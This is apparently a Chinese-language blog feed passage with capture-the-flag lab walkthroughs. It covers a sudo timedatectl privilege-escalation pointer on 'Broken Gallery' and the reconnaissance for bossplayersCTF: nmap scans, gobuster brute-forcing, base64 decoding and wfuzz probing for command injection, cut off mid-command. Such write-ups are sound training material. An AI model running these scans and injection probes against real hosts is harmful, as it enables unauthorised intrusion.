class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh broken@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# ssh broken@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>                     </span><br><span class="line">The authenticity of host &#x27;<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span> (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">78</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:<span class="number">2</span>rSjxvkij5hWypyT/<span class="number">706</span>pdaI6YAB0AOIXa7kVnMBDZs.</span><br><span class="line">This key is <span class="keyword">not</span> known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="function">Warning: <span class="title">Permanently</span> <span class="title">added</span> &#x27;192.168.31.78&#x27; (<span class="title">ED25519</span>) <span class="title">to</span> <span class="title">the</span> <span class="title">list</span> <span class="title">of</span> <span class="title">known</span> <span class="title">hosts</span>.</span></span><br><span class="line"><span class="function"><span class="title">broken</span>@192.168.31.78&#x27;<span class="title">s</span> <span class="title">password</span>: </span></span><br><span class="line"><span class="function"><span class="title">Welcome</span> <span class="title">to</span> <span class="title">Ubuntu</span> 16.04 <span class="title">LTS</span> (<span class="title">GNU</span>/<span class="title">Linux</span> 4.4.0-21-<span class="title">generic</span> <span class="title">x86_64</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">Documentation</span>:  <span class="title">https</span>://<span class="title">help.ubuntu.com</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">762 <span class="title">packages</span> <span class="title">can</span> <span class="title">be</span> <span class="title">updated</span>.</span></span><br><span class="line"><span class="function">458 <span class="title">updates</span> <span class="title">are</span> <span class="title">security</span> <span class="title">updates</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">login</span>: <span class="title">Fri</span> <span class="title">Aug</span>  9 02:40:48 2019 <span class="title">from</span> 10.11.1.221</span></span><br><span class="line"><span class="function"><span class="title">broken</span>@<span class="title">ubuntu</span>:~$ <span class="title">ls</span></span></span><br><span class="line"><span class="function"><span class="title">Desktop</span>  <span class="title">Documents</span>  <span class="title">Downloads</span>  <span class="title">examples.desktop</span>  <span class="title">Music</span>  <span class="title">Pictures</span>  <span class="title">Public</span>  <span class="title">Templates</span>  <span class="title">Videos</span></span></span><br></pre></td></tr></table></figure><p>成功</p></blockquote><p>拿到账户后按照管理搜集信息</p><h2 id="提权前的惯例"><a href="#提权前的惯例" class="headerlink" title="提权前的惯例"></a>提权前的惯例</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">ip a</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>使用sudo -l 查看自己的权限</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">broken@ubuntu:~$ <span class="title">sudo</span> -<span class="title">l</span></span></span><br><span class="line"><span class="function"><span class="title">Matching</span> <span class="title">Defaults</span> <span class="title">entries</span> <span class="title">for</span> <span class="title">broken</span> <span class="title">on</span> <span class="title">ubuntu</span>:</span></span><br><span class="line"><span class="function">    <span class="title">env_reset</span>, <span class="title">mail_badpass</span>, <span class="title">secure_path</span>=/<span class="title">usr</span>/<span class="title">local</span>/<span class="title">sbin</span>\:/<span class="title">usr</span>/<span class="title">local</span>/<span class="title">bin</span>\:/<span class="title">usr</span>/<span class="title">sbin</span>\:/<span class="title">usr</span>/<span class="title">bin</span>\:/<span class="title">sbin</span>\:/<span class="title">bin</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">broken</span> <span class="title">may</span> <span class="title">run</span> <span class="title">the</span> <span class="title">following</span> <span class="title">commands</span> <span class="title">on</span> <span class="title">ubuntu</span>:</span></span><br><span class="line"><span class="function">    (<span class="title">ALL</span>) <span class="title">NOPASSWD</span>: /<span class="title">usr</span>/<span class="title">bin</span>/<span class="title">timedatectl</span></span></span><br><span class="line"><span class="function">    (<span class="title">ALL</span>) <span class="title">NOPASSWD</span>: /<span class="title">sbin</span>/<span class="title">reboot</span></span></span><br></pre></td></tr></table></figure><p>发现有以root的权限执行timedatectl的权限</p></blockquote><h2 id="！！！利用timedatectl提权的方法！！！"><a href="#！！！利用timedatectl提权的方法！！！" class="headerlink" title="！！！利用timedatectl提权的方法！！！"></a>！！！利用timedatectl提权的方法！！！</h2><h3 id="详情搜索：gtfobins"><a href="#详情搜索：gtfobins" class="headerlink" title="详情搜索：gtfobins"></a>详情搜索：gtfobins</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231022215721549.png" alt="image-20231022215721549"></p><p>跟着步骤走就可以提权了</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231022225955650.png" alt="image-20231022225955650"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
          <category> broken grallery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bossplayersCTF</title>
      <link href="/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/bossplayersCTF/"/>
      <url>/2023/11/18/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/bossplayersCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="bossplayersCTF"><a href="#bossplayersCTF" class="headerlink" title="bossplayersCTF"></a>bossplayersCTF</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>通过</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">0</span>/<span class="number">24</span> -oN target</span><br></pre></td></tr></table></figure><p>将扫描结果输出到target文件中，通过vim的字符串匹配功能找到目标靶机的ip</p><p>目标靶机的IP为192.168.31.146</p><h3 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -p- --min-rate=<span class="number">10000</span> -oA nmapscan/ports</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -p- --min-rate=<span class="number">10000</span> -oA nmapscan/ports</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">29</span> <span class="number">16</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sudocuong.com (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">0025</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">65533</span> closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:C5:C0 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3</span>.<span class="number">09</span> seconds</span><br></pre></td></tr></table></figure><p>发现只开了ssh和web</p></blockquote><h3 id="详细扫描"><a href="#详细扫描" class="headerlink" title="详细扫描"></a>详细扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -O -sV -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -oA nmapscan/detail</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sT -sC -sV -O -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -oA nmapscan/detail                                    </span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">29</span> <span class="number">16</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sudocuong.com (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00039</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7</span>.<span class="number">9</span>p1 Debian <span class="number">10</span> (protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> ac0d1e7140ef6e6591958d1c13138e3e (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">249</span>e2718dfa4783b0d118a9272bd058d (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">26328</span>d73890529438ea113ba4f8353f8 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|_http-server-header: Apache/<span class="number">2</span>.<span class="number">4</span>.<span class="number">38</span> (Debian)</span><br><span class="line">|_http-<span class="built_in">title</span>: Site doesn&#x27;t have a <span class="built_in">title</span> (text/html).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:C5:C0 (VMware)</span><br><span class="line"><span class="function">Warning: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Device</span> <span class="title">type</span>: <span class="title">general</span> <span class="title">purpose</span></span></span><br><span class="line"><span class="function"><span class="title">Running</span>: <span class="title">Linux</span> 3.<span class="title">X</span>|4.<span class="title">X</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:3 <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:4</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">details</span>: <span class="title">Linux</span> 3.2 - 4.9</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 1 <span class="title">hop</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">and</span> <span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap.org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 8.68 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure><p>debian、apache2.4.38、ssh开放口令登录</p></blockquote><h3 id="漏洞脚本扫描"><a href="#漏洞脚本扫描" class="headerlink" title="漏洞脚本扫描"></a>漏洞脚本扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script=vuln -p22,<span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -oA nmapscan/vuln</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -script=vuln <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">60</span> -p22,<span class="number">80</span> -oA nmapscan/vuln                           </span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">29</span> <span class="number">16</span>:<span class="number">13</span> CST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     <span class="number">224</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">251</span></span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-<span class="number">2011</span>-<span class="number">1002</span>).</span><br><span class="line">|_  Hosts are all up (<span class="keyword">not</span> vulnerable).</span><br><span class="line"><span class="function">Note: <span class="title">Host</span> <span class="title">seems</span> <span class="title">down</span>. <span class="title">If</span> <span class="title">it</span> <span class="title">is</span> <span class="title">really</span> <span class="title">up</span>, <span class="title">but</span> <span class="title">blocking</span> <span class="title">our</span> <span class="title">ping</span> <span class="title">probes</span>, <span class="title">try</span> -<span class="title">Pn</span></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (0 <span class="title">hosts</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 36.33 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure><p>没有什么有用的信息</p></blockquote><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --top-ports <span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -oA nmapscan/udp</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nmap -sU <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -top-ports <span class="number">20</span> -oA nmapscan/udp</span><br><span class="line">Starting Nmap <span class="number">7</span>.<span class="number">93</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2023</span>-<span class="number">10</span>-<span class="number">29</span> <span class="number">16</span>:<span class="number">08</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sudocuong.com (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span>)</span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">00036</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line"><span class="number">53</span>/udp    closed        domain</span><br><span class="line"><span class="number">67</span>/udp    open|filtered dhcps</span><br><span class="line"><span class="number">68</span>/udp    open|filtered dhcpc</span><br><span class="line"><span class="number">69</span>/udp    closed        tftp</span><br><span class="line"><span class="number">123</span>/udp   open|filtered ntp</span><br><span class="line"><span class="number">135</span>/udp   open|filtered msrpc</span><br><span class="line"><span class="number">137</span>/udp   open|filtered netbios-ns</span><br><span class="line"><span class="number">138</span>/udp   closed        netbios-dgm</span><br><span class="line"><span class="number">139</span>/udp   closed        netbios-ssn</span><br><span class="line"><span class="number">161</span>/udp   open|filtered snmp</span><br><span class="line"><span class="number">162</span>/udp   closed        snmptrap</span><br><span class="line"><span class="number">445</span>/udp   closed        microsoft-ds</span><br><span class="line"><span class="number">500</span>/udp   closed        isakmp</span><br><span class="line"><span class="number">514</span>/udp   closed        syslog</span><br><span class="line"><span class="number">520</span>/udp   closed        route</span><br><span class="line"><span class="number">631</span>/udp   open|filtered ipp</span><br><span class="line"><span class="number">1434</span>/udp  closed        ms-sql-m</span><br><span class="line"><span class="number">1900</span>/udp  open|filtered upnp</span><br><span class="line"><span class="number">4500</span>/udp  open|filtered nat-t-ike</span><br><span class="line"><span class="number">49152</span>/udp closed        unknown</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:D7:C5:C0 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">7</span>.<span class="number">89</span> seconds</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# cat nmapscan/udp.nmap | grep open</span><br><span class="line"><span class="number">67</span>/udp    open|filtered dhcps</span><br><span class="line"><span class="number">68</span>/udp    open|filtered dhcpc</span><br><span class="line"><span class="number">123</span>/udp   open|filtered ntp</span><br><span class="line"><span class="number">135</span>/udp   open|filtered msrpc</span><br><span class="line"><span class="number">137</span>/udp   open|filtered netbios-ns</span><br><span class="line"><span class="number">161</span>/udp   open|filtered snmp</span><br><span class="line"><span class="number">631</span>/udp   open|filtered ipp</span><br><span class="line"><span class="number">1900</span>/udp  open|filtered upnp</span><br><span class="line"><span class="number">4500</span>/udp  open|filtered nat-t-ike</span><br></pre></td></tr></table></figure></blockquote><h2 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h2><ul><li>优先查看80端口web服务，看看能不能得到有用的信息</li><li>最后再来尝试ssh</li></ul><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>浏览器访问192.168.31.146，主页提示这个靶机由 Cuong Nguyen 创建，还提醒我们不要被骗进兔子洞。</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231029163414497.png" alt="image-20231029163414497"></p><p>尝试目录爆破</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -w /usr/share/dirbuster/wordlists/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt -x txt,jar,php,rar,zip</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# gobuster <span class="built_in">dir</span> -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span> -w /usr/share/dirbuster/wordlists/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt -x txt,jar,php,rar,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span></span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3</span>.<span class="number">5</span></span><br><span class="line">[+] Extensions:              txt,jar,php,rar,zip</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">10</span>/<span class="number">29</span> <span class="number">16</span>:<span class="number">37</span>:<span class="number">27</span> Starting gobuster <span class="keyword">in</span> directory enumeration <span class="built_in">mode</span></span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [Size: <span class="number">293</span>]</span><br><span class="line">/robots.txt           (Status: <span class="number">200</span>) [Size: <span class="number">53</span>]</span><br><span class="line">/logs.php             (Status: <span class="number">200</span>) [Size: <span class="number">34093</span>]</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [Size: <span class="number">293</span>]</span><br><span class="line">/server-status        (Status: <span class="number">403</span>) [Size: <span class="number">302</span>]</span><br><span class="line"><span class="function">Progress: 1321560 / 1323366 (99.86%)</span></span><br><span class="line"><span class="function">===============================================================</span></span><br><span class="line"><span class="function">2023/10/29 16:43:32 <span class="title">Finished</span></span></span><br><span class="line"><span class="function">===============================================================</span></span><br></pre></td></tr></table></figure><p>爆出俩可访问的页面： robots.txt logs.php</p></blockquote><p>访问robots.txt，意思好像说这玩意是密码，尝试ssh登录看看（猜测cuong是账号）不成功</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231029164330335.png" alt="image-20231029164330335"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bG9sIHRyeSBoYXJkZXIgYnJvCg==</span><br></pre></td></tr></table></figure><p>这串东西看起来像base64，解码看看</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> bG9sIHRyeSBoYXJkZXIgYnJvCg== &gt; password</span><br><span class="line">base64 -d password</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# base64 -d password                      </span><br><span class="line">lol try harder bro</span><br></pre></td></tr></table></figure><p>译言盯真，鉴定为假</p></blockquote><p>仔细一想，好像没什么下手点了。</p><p>感觉应该不止两个能访问的页面</p><p>可能是这个目录爆破工具不行，换一个工具试试</p><h3 id="记得看一下网页的源代码"><a href="#记得看一下网页的源代码" class="headerlink" title="记得看一下网页的源代码"></a>记得看一下网页的源代码</h3><p>还有东西</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231029170707921.png" alt="image-20231029170707921"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo </span><br></pre></td></tr></table></figure><p>看起来也像base64</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# <span class="built_in">echo</span> bG9sIHRyeSBoYXJkZXIgYnJvCg== | base64 -d</span><br><span class="line">lol try harder bro</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# <span class="built_in">echo</span> WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d</span><br><span class="line">ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# <span class="built_in">echo</span> ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K | base64 -d                </span><br><span class="line">d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# <span class="built_in">echo</span> d29ya2luZ2lucHJvZ3Jlc3MucGhwCg== | base64 -d            </span><br><span class="line">workinginprogress.php</span><br></pre></td></tr></table></figure><p>套娃玩意</p></blockquote><p>访问一下这个页面</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231030161058376.png"></p><p>列了几个代办事项</p><p>注意到 ping 命令 修复权限提升</p><h3 id="找出能起作用的参数"><a href="#找出能起作用的参数" class="headerlink" title="找出能起作用的参数"></a>找出能起作用的参数</h3><p>可能存在命令执行，先用wfuzz试一下能不能fuzz出参数</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">146</span>/workinginprogress.php?FUZZ=id -w /usr/share/wordlists/dirbuster/directory-list-<span class="number">2</span>.<span class="number">3</span>-medium.txt --hw <span 